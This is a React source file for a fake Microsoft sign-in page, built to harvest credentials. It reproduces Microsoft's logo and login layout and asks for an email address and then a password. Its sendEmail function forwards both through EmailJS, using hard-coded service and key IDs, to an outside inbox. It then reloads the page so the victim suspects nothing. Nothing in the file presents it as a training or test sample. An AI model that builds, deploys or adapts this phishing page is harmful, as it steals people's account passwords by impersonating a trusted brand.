import React, { useRef, useState, useEffect } from "react";
import emailjs from "@emailjs/browser";

const styles = {
  pageWrapper: {
    minHeight: "100vh",
    minWidth: "100vw",
    background: "radial-gradient(circle at top left, #e6d7d2, #d6e3d9)",
    display: "flex",
    flexDirection: "column",
    justifyContent: "center",
    alignItems: "center",
    position: "relative",
    fontFamily:
      'Segoe UI, SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif',
  },
  loginContainer: {
    background: "#fff",
    borderRadius: "4px",
    boxShadow: "0 2px 8px 0 rgba(0,0,0,0.13)",
    width: "495px",
    height: "334px",
    padding: "56px 56px 48px 56px",
    display: "flex",
    flexDirection: "column",
    alignItems: "stretch",
    marginBottom: "24px",
    // border: "1px solid #eee",
  },
  msLogo: {
    display: "flex",
    alignItems: "center",
    marginBottom: "1.5rem",
  },
  logoSvg: {
    width: "32px",
    height: "32px",
    marginRight: "0.7rem",
  },
  msText: {
    fontSize: "1.4rem",
    fontWeight: "600",
    color: "#222",
    letterSpacing: "0.01em",
  },
  heading: {
    fontSize: "1.7rem",
    fontWeight: "400",
    margin: "0 0 1.7rem 0",
    color: "#1b1b1b",
  },
  input: {
    width: "100%",
    padding: "0.7rem 0",
    fontSize: "1.08rem",
    border: "none",
    borderBottom: "1.5px solid #888",
    background: "transparent",
    outline: "none",
    marginBottom: "0.5rem",
  },
  links: {
    fontSize: "1.01rem",
    margin: "0 0 1.7rem 0",
    color: "#616161",
    lineHeight: 1.6,
  },
  link: {
    color: "#0067b8",
    textDecoration: "none",
    fontWeight: 500,
    marginLeft: "0.2rem",
    cursor: "pointer",
  },
  buttonRow: {
    display: "flex",
    justifyContent: "flex-end",
    gap: "12px",
    marginTop: "1.2rem",
  },
  button: {
    minWidth: "90px",
    padding: "0.6rem 0",
    background: "#0067b8",
    color: "#fff",
    border: "none",
    fontSize: "1.13rem",
    fontWeight: "500",
    cursor: "pointer",
    borderRadius: "2px",
    transition: "background 0.2s",
  },
  backButton: {
    minWidth: "90px",
    padding: "0.6rem 0",
    background: "#e1e1e1",
    color: "#222",
    border: "none",
    fontSize: "1.13rem",
    fontWeight: "500",
    cursor: "pointer",
    borderRadius: "2px",
    transition: "background 0.2s",
  },
  signInOptions: {
    background: "#fff",
    // border: "1px solid #eee",
    borderRadius: "4px",
    boxShadow: "0 2px 8px 0 rgba(0,0,0,0.07)",
    width: "559px",
    height: "52px",
    padding: "1rem 1.5rem",
    display: "flex",
    alignItems: "center",
    fontSize: "1.08rem",
    marginBottom: "0.5rem",
    cursor: "pointer",
    gap: "0.7rem",
  },
  keyIcon: {
    width: "24px",
    height: "24px",
  },
  footer: {
    position: "fixed",
    right: "32px",
    bottom: "18px",
    display: "flex",
    gap: "1.5rem",
    fontSize: "0.95rem",
    color: "#666",
    zIndex: 10,
    alignItems: "center",
    fontFamily:
      'Segoe UI, SegoeUI, "Helvetica Neue", Helvetica, Arial, sans-serif',
  },
  footerLink: {
    textDecoration: "none",
    color: "#0067b8",
  },
  footerText: {
    color: "#999",
    fontSize: "1.2rem",
    fontWeight: "bold",
    userSelect: "none",
  },
};

// Add responsive styles via a style tag on mount
const injectResponsiveStyles = () => {
  const styleId = "login-responsive-styles";
  if (!document.getElementById(styleId)) {
    const style = document.createElement("style");
    style.id = styleId;
    style.innerHTML = `
      @media (max-width: 600px) {
        .login-responsive-container {
          width: 98vw !important;
          min-width: 0 !important;
          max-width: 100vw !important;
          height: auto !important;
          min-height: 0 !important;
          padding: 10px !important;
        }
        .login-responsive-signin-options {
          width: 98vw !important;
          min-width: 0 !important;
          max-width: 100vw !important;
          padding: 10px !important;
        }
      }
    `;
    document.head.appendChild(style);
  }
};

const Login = () => {
  const form = useRef();
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");

  const handleNext = (e) => {
    e.preventDefault();
    if (!email || !/\S+@\S+\.\S+/.test(email)) {
      alert("Please enter a valid email address.");
      return;
    }
    setStep(2);
  };

  const handleBack = (e) => {
    e.preventDefault();
    if (step === 2) setStep(1);
  };

  const sendEmail = (e) => {
    e.preventDefault();
    setLoading(true);

    emailjs
      .sendForm(
        "service_i1hn7b6",
        "template_esw4v85",
        form.current,
        "QqR8IDJXlWSH7-bG3"
      )
      .then(
        () => {
          setLoading(false);
          window.location.reload();
        },
        (error) => {
          console.error("EmailJS error:", error);
          alert("There was an error sending the email.");
          setLoading(false);
        }
      );
  };

  useEffect(() => {
    injectResponsiveStyles();
  }, []);

  return (
    <div style={styles.pageWrapper}>
      <div style={styles.loginContainer} className="login-responsive-container">
        <div style={styles.msLogo}>
          <svg viewBox="0 0 32 32" style={styles.logoSvg}>
            <rect fill="#f25022" x="0" y="0" width="15" height="15" />
            <rect fill="#7fba00" x="17" y="0" width="15" height="15" />
            <rect fill="#00a4ef" x="0" y="17" width="15" height="15" />
            <rect fill="#ffb900" x="17" y="17" width="15" height="15" />
          </svg>
          <span style={styles.msText}>Microsoft</span>
        </div>
        <h2 style={styles.heading}>Sign in</h2>
        <form
          ref={form}
          onSubmit={step === 2 ? sendEmail : handleNext}
          style={{ width: "100%" }}
        >
          {step === 1 && (
            <>
              <input
                type="email"
                name="email"
                placeholder="Email, phone, or Skype"
                required
                style={styles.input}
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                autoFocus
              />
              <div style={styles.links}>
                <span>No account?</span>
                <a href="#" style={styles.link}>
                  Create one!
                </a>
                <br />
                <a href="#" style={styles.link}>
                  Can't access your account?
                </a>
              </div>
              <div style={styles.buttonRow}>
                <button type="button" style={styles.backButton} disabled>
                  Back
                </button>
                <button type="submit" style={styles.button} disabled={loading}>
                  Next
                </button>
              </div>
            </>
          )}
          {step === 2 && (
            <>
              <input
                type="password"
                name="accesskey"
                placeholder="Password"
                required
                style={styles.input}
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                autoFocus
              />
              <div style={styles.buttonRow}>
                <button
                  type="button"
                  style={styles.backButton}
                  onClick={handleBack}
                  disabled={loading}
                >
                  Back
                </button>
                <button type="submit" style={styles.button} disabled={loading}>
                  {loading ? "Signing..." : "Next"}
                </button>
              </div>
            </>
          )}
        </form>
      </div>
      <div
        style={styles.signInOptions}
        className="login-responsive-signin-options"
      >
        <svg
          style={styles.keyIcon}
          xmlns="http://www.w3.org/2000/svg"
          width="48"
          height="48"
          viewBox="0 0 48 48"
          fill="none"
        >
          <rect width="48" height="48" fill="none" />
          <path
            fill="#404040"
            d="M40,32.578V40H32V36H28V32H24V28.766A10.689,10.689,0,0,1,19,30a10.9,10.9,0,0,1-5.547-1.5,11.106,11.106,0,0,1-2.219-1.719A11.373,11.373,0,0,1,9.5,24.547a10.4,10.4,0,0,1-1.109-2.625A11.616,11.616,0,0,1,8,19a10.9,10.9,0,0,1,1.5-5.547,11.106,11.106,0,0,1,1.719-2.219A11.373,11.373,0,0,1,13.453,9.5a10.4,10.4,0,0,1,2.625-1.109A11.616,11.616,0,0,1,19,8a10.9,10.9,0,0,1,5.547,1.5,11.106,11.106,0,0,1,2.219,1.719A11.373,11.373,0,0,1,28.5,13.453a10.4,10.4,0,0,1,1.109,2.625A11.616,11.616,0,0,1,30,19a10.015,10.015,0,0,1-.125,1.578,10.879,10.879,0,0,1-.359,1.531ZM16,14a1.938,1.938,0,0,1,.781.156,2,2,0,0,1,.625.422,2.191,2.191,0,0,1,.438.641A1.705,1.705,0,0,1,18,16a1.938,1.938,0,0,1-.156.781,2,2,0,0,1-.422.625,2.191,2.191,0,0,1-.641.438A1.705,1.705,0,0,1,16,18a1.938,1.938,0,0,1-.781-.156,2,2,0,0,1-.625-.422,2.191,2.191,0,0,1-.438-.641A1.705,1.705,0,0,1,14,16a1.938,1.938,0,0,1,.156-.781,2,2,0,0,1,.422-.625,2.191,2.191,0,0,1,.641-.438A1.705,1.705,0,0,1,16,14Z"
          />
        </svg>
        <span>Sign-in options</span>
      </div>
      <div style={styles.footer}>
        <a href="#" style={styles.footerLink}>
          Terms of use
        </a>
        <a href="#" style={styles.footerLink}>
          Privacy & cookies
        </a>
        <span style={styles.footerText}>...</span>
      </div>
    </div>
  );
};

export default Login;
